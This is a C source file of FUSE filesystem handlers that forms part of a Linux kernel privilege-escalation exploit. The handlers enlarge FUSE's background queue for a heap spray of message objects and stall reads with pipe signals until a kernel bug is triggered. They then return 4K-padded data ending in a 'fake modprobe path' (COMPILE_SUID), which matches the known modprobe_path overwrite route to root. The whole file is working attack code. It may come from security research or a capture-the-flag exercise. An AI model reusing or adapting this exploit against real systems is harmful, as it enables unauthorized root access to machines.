#include "fuse-handlers.h"

// see https://www.maastaar.net/fuse/linux/filesystem/c/2016/05/21/writing-a-simple-filesystem-using-fuse/

void *do_init(struct fuse_conn_info *conn) {
    // max_background determines the number of simultaneous requests that can be handled. by default it's 12, which is
    // less than N_SPRAY_MSG (16), so we need to increase that to allow all msg's created in threads to be handled
#if N_SPRAY_MSG > 12
    LOG("Initializing fuse options, setting max_background to %d", N_SPRAY_MSG);
    conn->max_background = N_SPRAY_MSG;
#endif
    return NULL;
}

int do_getattr(const char *path, struct stat *st) {
    st->st_uid = getuid();
    st->st_gid = getgid();
    st->st_atime = time(NULL);
    st->st_mtime = time(NULL);

    if (strcmp(path, "/") == 0) {
        st->st_mode = S_IFDIR | 0755;
        st->st_nlink = 2;
    } else {
        st->st_mode = S_IFREG | 0644;
        st->st_nlink = 1;
        st->st_size = 1024;
    }

    return 0;
}

int do_readdir(const char *path, void *buffer, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {
    filler(buffer, ".", NULL, 0);
    filler(buffer, "..", NULL, 0);
    return 0;
}

int do_read(const char *path, char *buffer, size_t size, off_t offset, struct fuse_file_info *fi) {
    size_t len = 0x1000 - 0x30 + strlen(COMPILE_SUID) + 1;
    char data[len];
    char signal[1];

    // signal the main process that do_read has been called
    LOG("do_read has been called on path %s. Signaling main process to continue", path);
    write(pipe_fuse2main[1], "g", 1);
    LOG("Now I'll copy the payload to the destination buffer...");

    if (offset >= len)
        return size;
    if (offset + size > len)
        size = len - offset;

    // wait until vulnerability has been triggered
    LOG("Waiting for signal from main pricess to proceed...");
    read(pipe_main2fuse[0], signal, 1);
    LOG("Signal recevied from main process, we can proceed!");

    // return the data, i.e. padding of 0x1000-0x30 (to fill a 4k-malloc) and then the fake modprobe path
    memset(data, 'D', 0x1000 - 0x30);
    memcpy((void *)(data + 0x1000 - 0x30), COMPILE_SUID, strlen(COMPILE_SUID)+1);
    memcpy(buffer, data + offset, size);
    return size;
}
